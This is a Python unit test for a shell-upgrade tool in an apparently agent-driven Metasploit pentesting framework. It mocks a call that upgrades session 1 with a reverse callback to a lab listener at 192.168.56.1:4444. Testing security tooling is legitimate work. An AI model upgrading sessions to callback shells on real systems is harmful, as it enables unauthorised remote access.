"""
Unit tests for ShellUpgradeTool. Pure mock — no live msfrpcd needed.

Run:
    pytest tests/tool_tests/test_shell_upgrade.py -v
"""
from unittest.mock import MagicMock

from tools.builtin.shell_upgrade import ShellUpgradeTool
from agent.state import AgentState


def test_requests_shell_upgrade_with_given_callback():
    client = MagicMock()
    client.sessions.shell_upgrade.return_value = {"result": "success"}
    tool = ShellUpgradeTool(client)

    result = tool.execute(AgentState(), session_id=1, lhost="192.168.56.1", lport=4444)

    assert result.success is True
    client.sessions.shell_upgrade.assert_called_once_with(1, "192.168.56.1", 4444)
